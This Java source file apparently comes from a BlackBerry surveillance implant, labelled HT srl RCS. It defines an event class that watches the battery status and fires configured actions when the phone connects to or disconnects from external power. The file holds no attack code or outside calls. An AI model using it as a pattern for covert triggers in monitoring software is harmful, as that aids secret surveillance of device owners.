//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : AcEvent.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.event;

import net.rim.device.api.system.DeviceInfo;
import blackberry.AppListener;
import blackberry.action.Action;
import blackberry.config.ConfEvent;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.interfaces.BatteryStatusObserver;


/**
 * The Class AcEvent.
 */
public final class EventAc extends Event implements BatteryStatusObserver {
    //#ifdef DEBUG
    private static Debug debug = new Debug("AcEvent", DebugLevel.VERBOSE);
    //#endif

    // private int lastStatus;

    int actionOnEnter;
    int actionOnExit;


    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStart()
     */
    protected void actualStart() {
        //#ifdef DEBUG
        debug.trace("actualStart: AcEvent");
        //#endif
        AppListener.getInstance().addBatteryStatusObserver(this);
    }

    protected void actualGo() {
    
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualStop()
     */
    protected void actualStop() {
        //#ifdef DEBUG
        debug.trace("actualStop: AcEvent");
        //#endif
        AppListener.getInstance().removeBatteryStatusObserver(this);
        onExit();
    }

    /**
     * Battery good.
     */
    public void batteryGood() {
        //#ifdef DEBUG
        debug.info("batteryGood");
        //#endif
    }

    /*
     * public void actualStop() { Application application =
     * Application.getApplication(); application.removeSystemListener(this);
     * debug.info("Removed SystemListener"); }
     */

    /**
     * Battery low.
     */
    public void batteryLow() {
        //#ifdef DEBUG
        debug.info("batteryLow");
        //#endif

    }

    /*
     * (non-Javadoc)
     * @see
     * blackberry.interfaces.BatteryStatusObserver#onBatteryStatusChange(int,
     * int)
     */
    public void onBatteryStatusChange(final int status, final int diff) {
        // se c'e' una variazione su AC_CONTACTS
        if ((diff & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) != 0) {

            //#ifdef DEBUG
            debug.trace("Variation on EXTERNAL_POWER");
            //#endif

            final boolean ac = (status & DeviceInfo.BSTAT_IS_USING_EXTERNAL_POWER) > 0;
            if (ac) {
                //#ifdef DEBUG
                debug.info("AC On Enter");
                //#endif
                if (actionOnEnter != Action.ACTION_NULL) {
                    onEnter();
                }
            } else {
                //#ifdef DEBUG
                debug.trace("Ac On Exit");
                //#endif
                if (actionOnExit != Action.ACTION_NULL) {
                    onExit();
                }
            }
        }
    }

    /*
     * (non-Javadoc)
     * @see blackberry.event.Event#parse(byte[])
     */
    protected boolean parse(ConfEvent conf) {
     
        return true;
    }

}
